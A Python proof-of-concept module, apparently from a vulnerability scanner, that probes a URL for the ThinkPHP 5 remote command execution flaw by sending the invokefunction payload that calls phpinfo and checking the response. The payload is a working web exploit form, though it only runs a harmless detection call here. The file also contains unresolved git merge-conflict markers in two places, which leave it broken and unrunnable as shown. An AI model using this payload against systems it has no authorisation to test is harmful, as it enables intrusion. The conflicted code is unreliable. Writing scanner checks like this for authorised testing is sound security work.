# -*- coding:utf-8 -*-
# Thinkphp5命令执行
from ServiceScanModel.models import ServiceScan
<<<<<<< HEAD
=======
from vulscan_Project.requestClass import Requests
>>>>>>> master


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
<<<<<<< HEAD
        self.requestUtil= self.Requests(service.cookies)
=======
        self.requestUtil= Requests(service.cookies)
>>>>>>> master
        self.result = False

    def thinkphp_rce(self, url):
        try:
            resp = self.requestUtil.get(url)
            if "http://www.php.net/" in resp.text:
                return ["Thinkphp5命令执行", r"s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1"]
            else:
                return []
        except:
            return []

    def fingerprint(self):
        if self.service.url:
            return True

    def poc(self):
        url = self.service.url + r"?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1"
        return self.thinkphp_rce(url)
